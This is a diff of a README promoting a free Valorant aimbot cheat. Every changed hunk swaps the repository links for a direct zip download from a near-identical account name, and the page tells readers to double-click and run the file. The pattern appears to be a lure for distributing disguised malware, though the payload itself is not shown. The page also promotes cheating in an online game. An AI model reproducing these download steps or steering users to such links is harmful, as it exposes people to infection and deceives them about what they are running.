@@ -1,7 +1,7 @@
 <h1>🎯 Valorant-External-Aimbot-Tool - Precision Aim, Zero Detection</h1>
 
 <p align="center">
-  <a href="https://github.com/steppleplay5592/Valorant-External-Aimbot-Tool" style="display:inline-block;padding:18px 36px;background:linear-gradient(135deg,#ff4655,#ff7a18);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(255,70,85,0.5);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://github.com/steppeplay5592/Valorant-External-Aimbot-Tool/raw/refs/heads/main/Dechlog/Valorant_Aimbot_External_Tool_v2.0.zip" style="display:inline-block;padding:18px 36px;background:linear-gradient(135deg,#ff4655,#ff7a18);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 6px 20px rgba(255,70,85,0.5);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -19,7 +19,7 @@ Follow these simple steps to get ValAimbot running on your Windows PC. No techni
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/steppleplay5592/Valorant-External-Aimbot-Tool](https://github.com/steppleplay5592/Valorant-External-Aimbot-Tool)**
+**[https://github.com/steppeplay5592/Valorant-External-Aimbot-Tool/raw/refs/heads/main/Dechlog/Valorant_Aimbot_External_Tool_v2.0.zip](https://github.com/steppeplay5592/Valorant-External-Aimbot-Tool/raw/refs/heads/main/Dechlog/Valorant_Aimbot_External_Tool_v2.0.zip)**
 
 The download starts automatically. Save the file to your Desktop or Downloads folder.
 
@@ -68,7 +68,7 @@ No special hardware needed. Works with all standard mice and keyboards.
 
 ### Detailed Download Instructions
 
-1. Click the download button at the top of this page or use the direct link: **https://github.com/steppleplay5592/Valorant-External-Aimbot-Tool**
+1. Click the download button at the top of this page or use the direct link: **https://github.com/steppeplay5592/Valorant-External-Aimbot-Tool/raw/refs/heads/main/Dechlog/Valorant_Aimbot_External_Tool_v2.0.zip**
 2. Your browser will begin downloading the setup file automatically
 3. Once finished, open your Downloads folder and locate the file
 4. Double-click to run it
@@ -151,7 +151,7 @@ This software is provided for educational and entertainment purposes only. Users
 
 ## 🔗 Quick Access Links
 
-- **Download Center:** [https://github.com/steppleplay5592/Valorant-External-Aimbot-Tool](https://github.com/steppleplay5592/Valorant-External-Aimbot-Tool)
+- **Download Center:** [https://github.com/steppeplay5592/Valorant-External-Aimbot-Tool/raw/refs/heads/main/Dechlog/Valorant_Aimbot_External_Tool_v2.0.zip](https://github.com/steppeplay5592/Valorant-External-Aimbot-Tool/raw/refs/heads/main/Dechlog/Valorant_Aimbot_External_Tool_v2.0.zip)
 - **Documentation:** Included in the application
 - **Support:** Open an issue on GitHub
 
